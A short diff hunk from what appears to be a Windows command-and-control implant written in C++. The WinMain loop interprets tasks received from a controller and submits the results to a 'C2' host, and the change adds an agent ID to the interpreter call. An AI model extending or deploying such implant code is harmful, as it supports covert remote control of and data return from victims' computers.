@@ -32,7 +32,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
 
         if (task.contains("task")) {
             nlohmann::json results;
-            results["result"] = misc::WideStringToUTF8(interpreter::InterpretTask(misc::UTF8ToWideString(task["task"])));
+            results["result"] = misc::WideStringToUTF8(interpreter::InterpretTask(misc::UTF8ToWideString(task["task"]), agent_id));
             communication::SubmitResults(C2, agent_id, results);
         }
 
